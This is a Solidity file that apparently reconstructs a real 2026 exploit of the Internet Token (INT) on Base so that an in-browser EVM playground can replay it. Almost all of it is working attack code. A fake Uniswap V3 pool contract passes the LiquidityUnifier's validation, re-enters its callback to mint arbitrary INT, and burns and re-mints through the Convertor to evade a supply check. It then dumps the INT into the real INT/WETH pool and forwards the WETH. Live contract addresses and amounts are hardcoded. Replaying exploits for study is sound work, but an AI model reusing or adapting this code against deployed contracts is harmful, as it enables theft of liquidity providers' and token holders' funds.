// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

// Internet Token (INT) — permissionless arbitrary-mint via a fake Uniswap V3 pool. Base, 2026-09.
// Cheatcode-free reconstruction of the on-chain attack for the EVM Playground. The whole
// exploit (which ran in the attacker's deployment constructor on-chain) is moved into attack()
// so the in-browser replay can record it opcode-by-opcode.

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface ILiquidityUnifier {
    function swapV3(address token, address pool) external;
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external;
}

interface IConvertor {
    // from == INT (mintable)        -> burns INT from caller, sends OTHER to caller
    // from == OTHER (transferrable) -> pulls OTHER from caller, mints INT to caller
    function convert(address from, uint256 amount) external;
}

interface IUniswapV3Pool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

// Minimal fake "pool": returns token0()/token1() so LiquidityUnifier's validation passes, and its
// swap() re-enters the unifier's callback to trigger the arbitrary mint. The same contract also
// implements uniswapV3SwapCallback so it can pay INT into the REAL INT/WETH pool for the profit leg.
contract FakePool {
    address internal immutable INT;
    address internal immutable OTHER;
    address internal immutable WETH;
    ILiquidityUnifier internal immutable UNIFIER;
    IConvertor internal immutable CONVERTOR;
    IUniswapV3Pool internal immutable REAL_POOL;
    address internal immutable OWNER;

    uint256 internal mintAmount;

    uint160 internal constant MAX_SQRT_RATIO_MINUS_ONE = 1461446703485210103287273052203988822378723970342 - 1;

    constructor(
        address _int,
        address _other,
        address _weth,
        ILiquidityUnifier _unifier,
        IConvertor _convertor,
        IUniswapV3Pool _realPool
    ) {
        INT = _int;
        OTHER = _other;
        WETH = _weth;
        UNIFIER = _unifier;
        CONVERTOR = _convertor;
        REAL_POOL = _realPool;
        OWNER = msg.sender;
    }

    // ---- fake Uniswap V3 pool surface used by LiquidityUnifier's validation ----
    function token0() external view returns (address) {
        return INT; // == rewardToken
    }

    function token1() external view returns (address) {
        return OTHER; // == the `token` argument passed to swapV3
    }

    // Called by LiquidityUnifier inside swapV3. We drive the unifier's own callback with the mint
    // amount WE choose, then neutralize the supply increase by converting the freshly minted INT
    // into OTHER (burns INT -> restores totalSupply) before swapV3's validateSupply post-check runs.
    function swap(
        address, /* recipient */
        bool, /* zeroForOne */
        int256, /* amountSpecified */
        uint160, /* sqrtPriceLimitX96 */
        bytes calldata /* data */
    ) external returns (int256, int256) {
        require(msg.sender == address(UNIFIER), "only unifier");

        // trigger arbitrary mint of `mintAmount` INT to this contract (currentPoolV3 == this)
        UNIFIER.uniswapV3SwapCallback(int256(mintAmount), int256(mintAmount), "");

        // burn the INT back out via the Convertor so supply is restored before validateSupply checks
        CONVERTOR.convert(INT, mintAmount);

        return (0, 0);
    }

    // Called by the REAL INT/WETH V3 pool during the profit swap: pay the INT we owe.
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
        require(msg.sender == address(REAL_POOL), "only real pool");
        if (amount1Delta > 0) {
            IERC20(INT).transfer(msg.sender, uint256(amount1Delta));
        }
        if (amount0Delta > 0) {
            IERC20(WETH).transfer(msg.sender, uint256(amount0Delta));
        }
    }

    function run(uint256 _mintAmount, uint256 dumpAmount) external {
        require(msg.sender == OWNER, "only owner");
        mintAmount = _mintAmount;

        IERC20(INT).approve(address(CONVERTOR), type(uint256).max);
        IERC20(OTHER).approve(address(CONVERTOR), type(uint256).max);

        // 1) permissionless swapV3 against our fake pool -> arbitrary mint + supply-neutralizing burn
        UNIFIER.swapV3(OTHER, address(this));

        // 2) re-mint the INT now that validateSupply is out of scope: OTHER -> INT
        CONVERTOR.convert(OTHER, mintAmount);

        // 3) realize WETH by dumping part of the minted INT into the real INT/WETH pool
        REAL_POOL.swap(address(this), false, int256(dumpAmount), MAX_SQRT_RATIO_MINUS_ONE, "");

        // 4) forward the loot to the owner (exploit) contract
        uint256 wethBal = IERC20(WETH).balanceOf(address(this));
        if (wethBal > 0) IERC20(WETH).transfer(OWNER, wethBal);
        uint256 intBal = IERC20(INT).balanceOf(address(this));
        if (intBal > 0) IERC20(INT).transfer(OWNER, intBal);
    }
}

// The attacker contract. On-chain the whole exploit ran in a throwaway contract's constructor;
// here it is exposed as attack() so the Playground can record it. Zero attacker capital, no role.
contract Exploit {
    address internal constant INT = 0x968D6A288d7B024D5012c0B25d67A889E4E3eC19;
    address internal constant OTHER = 0x1D34e08120dbD1Ea9BDBcD90C2dC919b50Ddff4C;
    address internal constant WETH = 0x4200000000000000000000000000000000000006;
    ILiquidityUnifier internal constant UNIFIER = ILiquidityUnifier(0x837DBAbc4f5FA78BAF177597edbDa09645822032);
    IConvertor internal constant CONVERTOR = IConvertor(0x6b82fDFC0344Bd76d5Cb58BC24D0FfE947975516);
    IUniswapV3Pool internal constant REAL_POOL = IUniswapV3Pool(0xDEc6EadbD8eD3F655CBA4Bb4eeFF6fB43B16969d);

    // Attacker-chosen mint size and dump size, as decoded from the on-chain receipt logs.
    uint256 internal constant MINT_AMOUNT = 0x02fd7b8b9b6ae2957e395f97; // 925,411,678.379023100 INT
    uint256 internal constant DUMP_AMOUNT = 0x856566164204289e81c00a; //  161,265,976.195260020 INT

    function attack() external {
        FakePool fake = new FakePool(INT, OTHER, WETH, UNIFIER, CONVERTOR, REAL_POOL);
        fake.run(MINT_AMOUNT, DUMP_AMOUNT);
        // WETH + INT loot is now held by this contract (FakePool forwarded it to its OWNER).
    }
}
